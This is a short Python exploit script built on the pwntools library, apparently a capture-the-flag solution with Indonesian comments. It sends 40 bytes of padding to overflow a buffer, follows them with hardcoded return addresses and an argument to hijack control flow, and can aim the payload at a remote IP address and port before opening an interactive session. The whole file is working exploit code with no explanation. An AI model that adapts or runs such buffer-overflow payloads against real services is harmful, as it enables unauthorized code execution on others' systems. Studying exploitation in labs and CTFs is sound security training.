from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)  
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    p = conn()
    padding = b'T' * 40 # jumlah agar buffer overflow
    payload = padding 
    
    # write your payload here
    payload+=p64(0x000000000040153a)
    payload+=p64(3)
    payload+=p64(0x000000000040153C)

    p.sendline("13523148")
    p.sendline("3")
    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()